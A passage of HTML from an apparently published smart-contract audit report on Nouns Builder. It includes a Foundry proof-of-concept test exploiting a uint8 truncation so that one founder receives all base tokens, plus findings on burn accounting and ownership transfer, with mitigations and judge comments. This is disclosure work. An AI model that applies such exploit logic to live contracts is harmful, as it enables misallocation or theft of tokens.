MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">15</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../src/manager/Manager.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">IToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Token</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../src/token/Token.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">TokenTypesV1</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../src/token/types/TokenTypesV1.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ERC1967Proxy</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../src/lib/proxy/ERC1967Proxy.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FounderGettingAllBaseTokensBug</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TokenTypesV1</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">imp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Deploying the implementation and the proxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">imp</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Token</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC1967Proxy</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">imp</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testFounderGettingAllBaseTokensBug</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chadFounder</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xdeadbeef</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">betaFounder</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xBBBBBBBB</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// beta</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Creating 2 founders with `ownershipPct = 256`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FounderParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">founders</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk10\">FounderParams</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">founders</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FounderParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">wallet:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chadFounder</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ownershipPct:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">256</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vestExpiry:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">founders</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FounderParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">wallet:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">betaFounder</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ownershipPct:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">256</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vestExpiry:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Initializing the proxy with the founders data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">founders</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// we don&#39;t care about these</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Asserting that the chad founder got all the base token ids</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// (`tokenId % 100` is calculated to get the base token, so it is enough to check only the first 100 token ids)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getScheduledRecipient</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">).</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">chadFounder</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Run with `forge test --match-test testFounderGettingAllBaseTokensBug`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Results:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//      [PASS] testFounderGettingAllBaseTokensBug() (gas: 13537465)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Great success</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit &#x26; foundry for the PoC</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Don’t truncate the <code>founderPct</code> variable to a uint8 when adding it to the totalOwnership variable, or alternatively check that it is less than <code>type(uint8).max</code> (or less or equal to 100).\nAfter applying this fix and running the test again, the result is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[FAIL. Reason: INVALID_FOUNDER_OWNERSHIP()] testFounderGettingAllBaseTokensBug() (gas: 58674)</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303#issuecomment-1257266323\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While this creates other issues (infinite loop), I will judge it separately as if the infinite loop was fixed, founders would be getting above 100% allocation.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303#issuecomment-1258505804\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to a unsafe casting, and mixed usage of variables, what is supposed to be a percentage of tokens receiveable by founders can reach a number above 100%.</p>\n<p>Beside an infinite loop, this can be used to sneakily set all future tokens, to have <code>tokenRecipient[_tokenId].wallet</code> set to a founder.</p>\n<p>I believe that a High Severity is not out of place for what is a unchecked overflow that can be abused, however, the specific attack vector that would trigger this can only be triggered at initial setup.</p>\n<p>Only the deployers can set founders and their percentages to be above 100%, and this can only happen at deployment.</p>\n<p>For that reason, I think Medium Severity is more appropriate.</p>\n<p>I invite all users to verify that the sum of all <code>founderPct</code> is way below 100% and I believe mitigation consists of either performing the safe cast, or changing the code to revert if allocation is above a more realistic value</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303#issuecomment-1266128288\">kulkarohan (Nouns Builder) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Per the following line, any founder that’s specified with a percentage ownership that results in the total ownership exceeding 100 will cause the function to revert: <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88\">Token.sol#L88</a>.</p>\n<p>Therefore the function would never actually reach <code>uint256 schedule = 100 / founderPct;</code> if the provided PoC were the case.</p>\n<p>There is however a small mistake in casting <code>uint8(founderPct)</code>, which is completely unnecessary on our part. But I believe this is a low/QA issue at best.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-22-owners-receive-more-percentage-of-total-nft-if-some-nfts-were-burnedbecause-were-not-sold\" style=\"position:relative;\"><a href=\"#m-22-owners-receive-more-percentage-of-total-nft-if-some-nfts-were-burnedbecause-were-not-sold\" aria-label=\"m 22 owners receive more percentage of total nft if some nfts were burnedbecause were not sold permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94\">[M-22] Owners receive more percentage of total nft if some nfts were burned(because were not sold)</a></h2>\n<p><em>Submitted by rvierdiiev</em></p>\n<p>According to Nouns Builder, founder can have percentage of created nft. This is set in <code>Token::_addFounders</code> function.\nWhen new nft is minted by <code>mint</code> function then total supply of tokens is incremented and assigned to tokenId using <code>tokenId = settings.totalSupply++</code>. Then this token is checked if it should be mint to founder(then again increment total supply of tokens) or should be mint to auction using <code>while (_isForFounder(tokenId))</code>.</p>\n<p>If token wasn’t sold during the auction then auction burns it using <code>burn</code> function. And this function doesn’t decrement <code>settings.totalSupply</code> value. But total supply <strong>has changed</strong> now, it has decreased by one.</p>\n<p>So suppose that we have 1 founder of dao that should receive 2% of nft, that means that if 100 nft are available(for example), then 2 of them belongs to that founder. If we have minted 100 nft and 10 of them were not sold(they were then burned), then there are 90 nft available now. And in current implementation founder has ownership of 2 of them, however <strong>2 is not 2% of 90</strong>. So in case when nft are not sold on auction the percentage of founder’s tokens is increasing and the increasing speed depends on how many tokens were not sold. Also founder gets more power in the community(as he has more percentage now).</p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213</a></p>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When <code>burn</code> function is called then do <code>settings.totalSupply--</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94#issuecomment-1258515434\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423\">#423</a>, this report is arguing the fairness of token distribution when a token is burned.</p>\n<p>I think that, because they are relating to a different aspect, this report is unique, however, because the impact and mechanism is based on burn not changing totalSupply, and “accounting being incorrect” because of that, then I believe this is also a Medium Severity finding.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-23-changing-treasury-owner-through-transferownership-can-break-governersol-and-auctionsol\" style=\"position:relative;\"><a href=\"#m-23-changing-treasury-owner-through-transferownership-can-break-governersol-and-auctionsol\" aria-label=\"m 23 changing treasury owner through transferownership can break governersol and auctionsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/468\">[M-23] Changing treasury owner through <code>transferOwnership()</code> can break <code>Governer.sol</code> and <code>Auction.sol</code></a></h2>\n<p><em>Submitted by scaraven</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L21\">Governor.sol#L21</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/utils/Ownable.sol#L63\">Ownable.sol#L63</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L22\">Auction.sol#L22</a><br></p>\n<p><code>governor.transferOwnership()</code> and <code>Auction.transferOwnership()</code> is exposed to <code>Treasury.sol</code> and can be called in a governance proposal. If this is used then it causes an inconsistency between the owner of these contracts and <code>settings.treasury</code> which would prevent governance from ever modifying its own parameters and Ethereum from auctions will be sent to the wrong address.</p>\n<p>I believe medium severity is suitable because we lose partial control of governance and/or ETH from auctions, assuming that a proposal (malicious or not) is passed which changes contract ownership.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>A proposal which calls <code>governor.transferOwnership()</code> is executed and transfers ownership to a new treasury address</li>\n<li>When subsequent proposals are passed, <code>Governor.sol</code> will make an external call to <code>settings.treasury</code> which is not modified when ownership is passed</li>\n<li>Therefore, <code>settings.treasury</code> is not able to modify any governance parameters such as <code>proposalThreshold</code></li>\n</ol>\n<p>The same issue applies to <code>Auction.sol</code>.</p>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 